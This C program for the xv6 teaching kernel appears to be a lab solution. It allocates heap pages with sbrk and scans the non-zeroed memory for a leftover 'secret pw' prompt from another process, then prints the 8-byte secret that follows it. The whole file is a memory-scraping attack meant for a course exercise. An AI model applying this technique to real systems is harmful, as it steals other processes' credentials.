#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGNUM 32
#define PROMPTLEN 32

int
main(int argc, char *argv[])
{
  char *end = sbrk(PGSIZE * PGNUM);
  const char* prompt = "my very very very secret pw is:";
  
  for(int i = 0; i < PGNUM; i++){
    int match_count = 0;
    for(int j = 0; j < PROMPTLEN; j++) {
      if(end[i * PGSIZE + j] == prompt[j]) {
        match_count++;
      }
    }

    // Must use fuzzy search; too accurate will fail
    // because of memory contamination?
    if(match_count > 20) {
      write(2, end + i * PGSIZE + 32, 8);
      exit(0);
    }
  }
  exit(1);
}
